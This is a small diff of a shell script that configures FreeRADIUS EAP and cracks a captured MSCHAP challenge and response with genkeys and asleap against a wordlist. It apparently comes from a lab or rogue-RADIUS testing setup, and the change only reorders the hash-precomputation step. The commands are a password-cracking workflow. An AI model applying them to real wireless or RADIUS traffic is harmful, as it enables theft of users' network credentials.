@@ -75,11 +75,12 @@ cat > /usr/local/etc/raddb/eap.conf <<EOF
 EOF
 
 
+genkeys -r /usr/share/wordlists/nmap.lst -f "$DIR/nt_hash.dat" -n "$DIR/nt_hash.idx"
+
 #/usr/local/sbin/radiusd -X -f
 /usr/local/sbin/radiusd -X
 
 cd "$DIR"
-genkeys -r /usr/share/wordlists/nmap.lst -f "$DIR/nt_hash.dat" -n "$DIR/nt_hash.idx"
 asleap -C e2:27:16:e2:20:c5:67:44 -R dc:73:83:29:57:5d:e0:e6:19:c3:fa:29:45:d8:a4:13:85:78:53:1b:ee:8d:ac:67 -f "$DIR/nt_hash.dat" -n "$DIR/nt_hash.idx"
 
 
